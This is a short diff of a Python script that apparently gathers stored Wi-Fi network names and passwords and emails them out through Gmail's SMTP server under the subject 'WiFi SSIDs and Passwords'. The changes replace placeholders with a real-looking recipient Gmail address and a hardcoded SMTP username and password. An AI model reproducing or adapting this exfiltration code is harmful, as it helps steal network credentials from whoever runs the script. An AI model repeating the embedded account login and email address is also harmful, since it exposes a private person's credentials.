@@ -30,8 +30,8 @@ for item in wifi_list:
     
 # Create EmailMessage Object
 email = EmailMessage()
-email["from"] = "name_of_sender"
-email["to"] = "email_address"
+email["from"] = "Fjoralba"
+email["to"] = "fjoralbakrasniqi12@gmail.com"
 email["subject"] = "WiFi SSIDs and Passwords"
 email.set_content(email_message)
 
@@ -40,5 +40,5 @@ email.set_content(email_message)
 with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
     smtp.ehlo()
     smtp.starttls()
-    smtp.login("login_name", "password")
+    smtp.login("fortesamujaj2000", "tesaronaalba")
     smtp.send_message(email)
